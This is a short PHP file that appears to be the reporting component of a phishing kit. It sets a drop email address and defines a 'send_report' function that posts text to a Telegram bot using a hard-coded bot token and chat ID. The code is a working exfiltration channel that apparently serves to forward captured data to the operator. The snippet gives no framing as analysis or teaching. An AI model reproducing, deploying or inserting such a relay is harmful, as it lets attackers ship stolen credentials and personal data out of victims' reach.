<?php
$Receive_email = "top4lyfe@atomicmail.io";

function send_report($to, $subject, $message) {
    $token = '7965408638:AAFFxFCY19zcoO_Dmvr67yX5CLmnCKFL-w0';
    $chat_id = '2130196697';
    $text = $subject . "\n\n" . $message;
    $url = "https://api.telegram.org/bot{$token}/sendMessage";
    $data = http_build_query(['chat_id' => $chat_id, 'text' => $text]);
    $ctx = stream_context_create(['http' => [
        'method'  => 'POST',
        'header'  => "Content-Type: application/x-www-form-urlencoded\r\n",
        'content' => $data,
    ]]);
    file_get_contents($url, false, $ctx);
}
